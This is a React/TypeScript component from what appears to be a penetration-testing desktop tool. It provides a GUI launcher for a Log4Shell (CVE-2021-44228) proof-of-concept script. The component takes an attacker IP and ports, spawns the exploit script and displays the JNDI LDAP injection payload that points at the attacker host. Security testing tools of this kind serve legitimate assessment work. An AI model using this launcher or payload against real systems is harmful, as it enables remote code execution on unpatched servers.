import { Button, LoadingOverlay, NumberInput, Stack, TextInput } from "@mantine/core";
import { useForm } from "@mantine/form";
import { IconDoorExit } from "@tabler/icons";
import { Child, Command } from "@tauri-apps/api/shell";
import { useCallback, useState } from "react";
import { CommandHelper } from "../../utils/CommandHelper";
import ConsoleWrapper from "../ConsoleWrapper/ConsoleWrapper";
import { UserGuide } from "../UserGuide/UserGuide";
import { SaveOutputToTextFile_v2 } from "../SaveOutputToFile/SaveOutputToTextFile"; //v2

const title = "Log4J Exploit";
const description_userguide =
    "This attack vector exploits vulnerabilities within Apacheâ€™s Log4j2 where an attacker that is in control of log " +
    "message/log message parameters is able to execute remote arbitrary code that is to be loaded in from LDAP servers " +
    "upon message lookup substitution being active.\n\nFurther information can be found at: https://nvd.nist.gov/vuln/" +
    "detail/cve-2021-44228\n\n" +
    "Using Log4J Exploit:\n" +
    "Step 1: Enter an Attacker IP address.\n" +
    "       Eg: 127.0.0.1\n\n" +
    "Step 2: Enter a Web Port.\n" +
    "       Eg: 8000\n\n" +
    "Step 3: Enter a Local Port.\n" +
    "       Eg: 9001\n\n" +
    "Step 4: Click Exploit to commence the exploits operation.\n\n" +
    "Step 5: View the Output block below to view the results of the attack vectors execution.";

interface FormValues {
    attackerip: string;
    webport: number;
    localport: number;
}

const CVE202144228 = () => {
    const [loading, setLoading] = useState(false);
    const [handle, setHandle] = useState<Child | null>(null);
    const [output, setOutput] = useState("");
    const [payloadLocation, setPayloadLocation] = useState<string | null>(null);
    const [webserverLocation, setWebserverLocation] = useState<string | null>(null);
    const [allowSave, setAllowSave] = useState(false);
    const [hasSaved, setHasSaved] = useState(false);

    let form = useForm({
        initialValues: {
            attackerip: "127.0.0.1",
            webport: 8000,
            localport: 9001,
        },
    });

    const onSubmit = async (values: FormValues) => {
        setLoading(true);

        // Disallow saving until the tool's execution is complete
        setAllowSave(false);

        const args = [
            "/usr/share/ddt/log4j-shell-poc/poc.py",
            "--userip",
            values.attackerip,
            "--webport",
            `${values.webport}`,
            "--lport",
            `${values.localport}`,
        ];
        const command = new Command("python3", args);
        const newHandle = await command.spawn();

        const payloadLocation = `\${jndi:ldap://${values.attackerip}:1389/a}`;
        const webserverLocation = "Starting webserver on port 8000 http://0.0.0.0:8000";

        setPayloadLocation(payloadLocation);
        setWebserverLocation(webserverLocation);

        const output = await CommandHelper.runCommand("python3", args);

        setHandle(newHandle);
        setOutput(output);
        setLoading(false);
        setAllowSave(true);
    };

    const killHandle = async () => {
        if (handle) {
            await handle.kill();
            setHandle(null);
            setPayloadLocation(null);
            setWebserverLocation(null);
        }
    };

    const clearOutput = useCallback(() => {
        setOutput("");
        setHasSaved(false);
        setAllowSave(false);
    }, [setOutput]);

    const handleSaveComplete = () => {
        // Indicating that the file has saved which is passed
        // back into SaveOutputToTextFile to inform the user
        setHasSaved(true);
        setAllowSave(false);
    };

    return (
        <form onSubmit={form.onSubmit((values) => onSubmit(values))}>
            <LoadingOverlay visible={loading} />
            <Stack>
                {UserGuide(title, description_userguide)}
                <TextInput label={"Attacker IP Address"} required {...form.getInputProps("attackerip")} />
                <NumberInput label={"Web Port"} required {...form.getInputProps("webport")} />
                <NumberInput label={"Local Port"} required {...form.getInputProps("localport")} />
                <Button type={"submit"}>Exploit</Button>
                {SaveOutputToTextFile_v2(output, allowSave, hasSaved, handleSaveComplete)}
                <ConsoleWrapper output={output} clearOutputCallback={clearOutput} />
                {handle && (
                    <Button leftIcon={<IconDoorExit />} onClick={killHandle} color={"red"}>
                        Kill process
                    </Button>
                )}
            </Stack>
        </form>
    );
};

export default CVE202144228;
